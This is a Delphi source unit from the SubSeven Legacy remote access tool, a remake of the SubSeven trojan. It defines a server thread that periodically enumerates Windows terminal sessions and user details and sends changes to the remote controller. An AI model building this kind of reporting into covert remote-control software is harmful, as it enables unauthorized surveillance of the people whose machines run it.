{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit Sub7.Thread.Net.Server.SystemInformationHook;

interface

uses System.Classes, XSuperObject, Sub7.Thread.Net.Server.Peer.IntervalThread,
     Sub7.Core.Protocol;

type
  TSub7SystemInformationHook = class(TSub7ServerPeerIntervalThread)
  private
    FLastSessions_Serialized : String;
    FLastUser_Serialized     : String;

    {@M}
    procedure EnumSessions();
    procedure EnumUser();
  protected
    {@M}
    procedure ExecuteInterval(); override;
    procedure ExecuteBegins(); override;
    procedure ExecuteEnds(); override;
  end;

implementation

uses WinAPI.Windows, System.SysUtils, Sub7.Core.Bundle, Sub7.Core.Windows.Process.Enum, Sub7.Core.Exceptions,
     Sub7.Core.Utils, Sub7.Core.Windows.Sessions.Enum, Sub7.Core.Diagnostic, Sub7.Service.External.Helper,
     Sub7.Core.Windows.User.Enum;

{-------------------------------------------------------------------------------
  Execute Begins / Ends Methods
-------------------------------------------------------------------------------}

procedure TSub7SystemInformationHook.ExecuteBegins();
begin
  FLastSessions_Serialized := '';
  FLastUser_Serialized     := '';
end;

procedure TSub7SystemInformationHook.ExecuteEnds();
begin
  ///
end;

{-------------------------------------------------------------------------------
  Enumerate Terminal Sessions
-------------------------------------------------------------------------------}
procedure TSub7SystemInformationHook.EnumSessions();
var ASessionList      : TS7EnumTerminalSessions;
    ASerializedOutput : String;
begin
  ASessionList := TS7EnumTerminalSessions.Create(True, True);
  try
    ASerializedOutput := ASessionList.Serialize.AsJson();
    if String.Compare(ASerializedOutput, FLastSessions_Serialized, True) <> 0 then begin
      FIOHandler.SendCommand(tshEnumSessions, ASessionList.Serialize);

      ///
      FLastSessions_Serialized := ASerializedOutput;
    end;
  finally
    if Assigned(ASessionList) then
      FreeAndNil(ASessionList);
  end;
end;

{-------------------------------------------------------------------------------
  Enumerate Users
-------------------------------------------------------------------------------}
procedure TSub7SystemInformationHook.EnumUser();
var AEnumUser         : TS7EnumUser;
    ASerializedOutput : String;
begin
  AEnumUser := TS7EnumUser.Create(True);
  try
    ASerializedOutput := AEnumUser.Serialize.AsJson();
    ///

    if String.Compare(ASerializedOutput, FLastUser_Serialized, True) <> 0 then begin
      FIOHandler.SendCommand(sihUser, AEnumUser.Serialize);

      ///
      FLastUser_Serialized := ASerializedOutput;
    end;
  finally
    if Assigned(AEnumUser) then
      FreeAndNil(AEnumUser);
  end;
end;

{-------------------------------------------------------------------------------
  On Command Received
-------------------------------------------------------------------------------}
procedure TSub7SystemInformationHook.ExecuteInterval();
begin
  self.EnumSessions();

  self.EnumUser();
end;

end.
